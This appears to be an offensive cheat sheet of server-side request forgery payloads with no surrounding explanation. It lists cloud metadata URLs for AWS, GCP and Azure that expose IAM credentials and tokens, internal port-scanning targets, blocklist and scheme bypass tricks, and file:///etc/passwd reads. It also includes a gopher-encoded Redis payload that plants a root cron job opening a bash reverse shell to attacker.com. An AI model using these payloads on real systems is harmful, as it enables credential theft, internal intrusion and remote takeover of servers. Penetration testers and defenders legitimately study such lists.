# SSRF Payloads & Techniques

## Basic Internal Targets
```
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
http://[::1]/
http://0177.0.0.1/        (octal)
http://2130706433/         (decimal for 127.0.0.1)
http://0x7f000001/         (hex)
```

## Cloud Metadata Endpoints
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/hostname

# AWS IMDSv2 (requires token — but try v1 first)
http://169.254.169.254/latest/api/token

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Digital Ocean
http://169.254.169.254/metadata/v1/
```

## Internal Network Scanning
```
http://192.168.1.1/
http://10.0.0.1/
http://172.16.0.1/
http://192.168.0.1:8080/
http://192.168.1.1:22/
http://192.168.1.1:3306/
http://192.168.1.1:6379/   (Redis)
http://192.168.1.1:9200/   (Elasticsearch)
http://192.168.1.1:27017/  (MongoDB)
```

## Bypass — Blocklist Filters
```
# Decimal
http://2130706433/

# Octal
http://0177.0.0.01/

# Hex
http://0x7f.0x0.0x0.0x1/
http://0x7f000001/

# IPv6
http://[::ffff:127.0.0.1]/
http://[::ffff:7f00:1]/

# DNS Rebinding
http://localtest.me/
http://127.0.0.1.nip.io/

# Redirect Chain
https://attacker.com/redirect → http://127.0.0.1/

# URL @ trick
http://attacker.com@127.0.0.1/
http://127.0.0.1#attacker.com
http://127.0.0.1?.attacker.com
```

## Bypass — Scheme Filters
```
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_INFO%0d%0a
file:///etc/passwd
file:///etc/hosts
ftp://attacker.com/x
```

## Gopher — Redis RCE
```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A*/1*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/attacker.com/4444%200>&1%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
```

## Blind SSRF — Out-of-Band Detection
```
http://YOUR-COLLAB.burpcollaborator.net/
http://YOUR-ID.interact.sh/
```

## Common Vulnerable Parameters
```
url=
redirect=
next=
path=
dest=
destination=
target=
callback=
webhook=
feed=
import=
fetch=
load=
proxy=
```
